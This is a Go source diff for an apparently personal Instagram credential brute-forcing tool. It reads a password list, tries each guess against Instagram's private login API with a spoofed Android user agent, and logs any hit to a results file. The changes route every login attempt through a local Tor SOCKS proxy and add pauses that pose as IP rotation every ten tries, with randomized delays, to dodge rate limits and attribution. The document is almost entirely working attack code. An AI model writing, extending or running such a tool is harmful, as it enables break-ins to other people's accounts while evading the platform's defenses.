@@ -12,14 +12,16 @@ import (
 	"os"
 	"strings"
 	"time"
+	"golang.org/x/net/proxy"
 )
 
 const (
 	API_URL      = "https://i.instagram.com/api/v1/"
 	USER_AGENT   = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 	TIMEOUT      = 10 * time.Second
-	CURRENT_TIME = "2025-05-23 23:14:48"
+	CURRENT_TIME = "2025-05-24 11:17:30"
 	CURRENT_USER = "monsmain"
+	TOR_PROXY    = "socks5://127.0.0.1:9150"
 )
 
 type InstagramResponse struct {
@@ -43,6 +45,16 @@ func main() {
 	fmt.Printf("Time: %s\n", CURRENT_TIME)
 	fmt.Printf("User: %s\n\n", CURRENT_USER)
 
+	// تست اتصال به Tor
+	fmt.Println("Testing Tor connection...")
+	_, err = getTorClient()
+	if err != nil {
+		fmt.Printf("❌ Error connecting to Tor: %v\n", err)
+		fmt.Println("Please make sure Tor Browser is running!")
+		return
+	}
+	fmt.Println("✅ Successfully connected to Tor\n")
+
 	var username string
 	fmt.Print("Enter Instagram username: ")
 	fmt.Scanln(&username)
@@ -58,9 +70,16 @@ func main() {
 
 	for i, password := range passwords {
 		fmt.Printf("[%d/%d] Testing password: %s\n", i+1, len(passwords), maskPassword(password))
-		
+
+		// تغییر IP هر 10 درخواست (در Tor Browser این کار خودکار انجام می‌شود)
+		if i > 0 && i%10 == 0 {
+			fmt.Println("\n🔄 Getting new Tor circuit...")
+			time.Sleep(5 * time.Second)
+			fmt.Println("✅ Ready with new IP")
+		}
+
 		success, response := tryLogin(username, password)
-		
+
 		if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
 			fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
 			fmt.Printf("Username: %s\n", username)
@@ -78,7 +97,6 @@ func main() {
 			}
 		}
 
-		// افزایش فاصله زمانی بین درخواست‌ها
 		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
 	}
 
@@ -86,9 +104,36 @@ func main() {
 	saveResult(username, "", false)
 }
 
+func getTorClient() (*http.Client, error) {
+	torProxy, err := url.Parse(TOR_PROXY)
+	if err != nil {
+		return nil, fmt.Errorf("error parsing tor proxy url: %v", err)
+	}
+
+	dialer, err := proxy.FromURL(torProxy, proxy.Direct)
+	if err != nil {
+		return nil, fmt.Errorf("error creating tor proxy dialer: %v", err)
+	}
+
+	transport := &http.Transport{
+		Dial: dialer.Dial,
+	}
+
+	return &http.Client{
+		Transport: transport,
+		Timeout:   TIMEOUT,
+	}, nil
+}
+
 func tryLogin(username, password string) (bool, InstagramResponse) {
+	client, err := getTorClient()
+	if err != nil {
+		log.Printf("Error creating Tor client: %v\n", err)
+		return false, InstagramResponse{}
+	}
+
 	loginUrl := API_URL + "accounts/login/"
-	
+
 	data := url.Values{}
 	data.Set("username", username)
 	data.Set("password", password)
@@ -107,7 +152,6 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 	req.Header.Set("X-IG-Capabilities", "3brTvw==")
 	req.Header.Set("X-IG-Connection-Type", "WIFI")
 
-	client := &http.Client{Timeout: TIMEOUT}
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Printf("Error sending request: %v\n", err)
@@ -129,8 +173,8 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 		return false, InstagramResponse{}
 	}
 
-	success := response.Status == "ok" || 
-		   strings.Contains(string(body), "logged_in_user")
+	success := response.Status == "ok" ||
+		strings.Contains(string(body), "logged_in_user")
 
 	return success, response
 }
@@ -145,7 +189,7 @@ func loadPasswords() []string {
 
 	var passwords []string
 	scanner := bufio.NewScanner(file)
-	
+
 	for scanner.Scan() {
 		pass := strings.TrimSpace(scanner.Text())
 		if pass != "" {
@@ -164,10 +208,10 @@ func saveResult(username, password string, success bool) {
 	} else {
 		status = "❌ FAILED"
 	}
-	
-	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n", 
+
+	logEntry := fmt.Sprintf("[%s] %s\nUsername: %s\nPassword: %s\n\n",
 		currentTime, status, username, password)
-	
+
 	file, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Printf("Error saving result: %v", err)
